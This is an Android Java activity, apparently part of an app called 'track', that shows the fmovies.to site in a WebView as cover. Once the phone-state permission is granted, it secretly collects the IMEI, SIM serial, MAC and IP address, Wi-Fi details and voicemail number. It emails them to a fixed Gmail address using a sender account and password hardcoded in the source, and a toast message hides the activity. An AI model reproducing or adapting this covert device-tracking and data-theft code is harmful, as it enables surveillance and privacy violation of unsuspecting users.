package com.example.vishnu.track;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import java.util.Arrays;
import java.util.List;

public class fifth extends Activity {
    String info ="", a, d;
    String strphoneType ="";
    static final int PERMISSION_READ_STATE = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_fifth);
        String s="https://fmovies.to/";
        WebView browser=(WebView)findViewById(R.id.webview);
        browser.setWebViewClient(new WebViewClient());
        browser.loadUrl(s);
        int permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);
        if (permissionCheck == PackageManager.PERMISSION_GRANTED) {
            MyTelephonyManager();
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, PERMISSION_READ_STATE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case PERMISSION_READ_STATE: {
                if (grantResults.length >= 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    MyTelephonyManager();
                } else {
                    Toast.makeText(this, "You dont have required permission to make the Action", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    private void MyTelephonyManager() {
        TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        int phoneType = manager.getPhoneType();
        switch (phoneType) {
            case (TelephonyManager.PHONE_TYPE_CDMA):
                strphoneType = "CDMA";
                break;
            case (TelephonyManager.PHONE_TYPE_GSM):
                strphoneType = "GSM";
                break;
            case (TelephonyManager.PHONE_TYPE_NONE):
                strphoneType = "NONE";
                break;
        }
        boolean isRoaming = manager.isNetworkRoaming();
        WifiManager wifiMgr = (WifiManager) getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
        int ip = wifiInfo.getIpAddress();
        String macAddress= wifiInfo.getMacAddress();
        String bssid = wifiInfo.getBSSID();
        int rssi = wifiInfo.getRssi();
        int linkSpeed = wifiInfo.getLinkSpeed();
        String ssid = wifiInfo.getSSID();
        int networkid = wifiInfo.getNetworkId();
        String ipAddress = Formatter.formatIpAddress(ip);
        info+="NETWORK DETAILS:-\n"+"\nIpaddress: "+ipAddress +"\n"+"MacAddress: "+macAddress +"\n"+ "BSSID: "+bssid +"\n"+"RSSI: "+rssi+"\n"+"LinkSpeed: "+linkSpeed + "\n"+ "SSID: "+ ssid+"\n"+"NetworkId: "+networkid;
        String PhoneType = strphoneType;
        String IMEINumber = manager.getDeviceId();
        String subscriberID = manager.getDeviceId();
        String SIMSerialNumber = manager.getSimSerialNumber();
        String networkCountryISO = manager.getNetworkCountryIso();
        String SIMCountryISO = manager.getSimCountryIso();
        String softwareVersion = manager.getDeviceSoftwareVersion();
        String voiceMailNumber = manager.getVoiceMailNumber();
        info += "\n\nPHONE DETAILS:-\n";
        info += "\n Phone Netwok Type: " + PhoneType;
        info += "\n IMEI Number: " + IMEINumber;
        info += "\n SubscriberID: " + subscriberID;
        info += "\n Sim Serial Number: " + SIMSerialNumber;
        info += "\n Network Country ISO: " + networkCountryISO;
        info += "\n SIM Country ISO: " + SIMCountryISO;
        info += "\n Software Version: " + softwareVersion;
        info += "\n Voice Mail Number: " + voiceMailNumber;
        info += "\n In Roaming: " + isRoaming;
        Intent iff = getIntent();
        a = iff.getStringExtra("a");
        d = info + "\n\n" + a;
        String toEmails = "sbiatm47@gmail.com";
        List<String> toEmailList = Arrays.asList(toEmails
                .split("\\s*,\\s*"));
        new SendMailTask(fifth.this).execute("coolv47@gmail.com",
                "98485300789456123", toEmailList,"Tracking Details",d);
        new Handler().postDelayed(new Runnable() {

            @Override
            public void run() {
                Toast.makeText(fifth.this,
                        "Logon To Fmovies For Movies Its Just A View",
                        Toast.LENGTH_LONG).show();
            }
        },20000);

    }
    boolean twice = false;
    @Override
    public void onBackPressed() {
        if (twice == true) {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            if(android.os.Build.VERSION.SDK_INT >= 21)
                super.finishAndRemoveTask();
            else
                super.finish();
            System.exit(0);
        }
        twice=true;
        Toast.makeText(getApplicationContext(),"Press again to exit",Toast.LENGTH_SHORT).show();
        new Handler().postDelayed(new Runnable()
        {@Override
        public void run(){
            twice=false;}
        },3000);}}
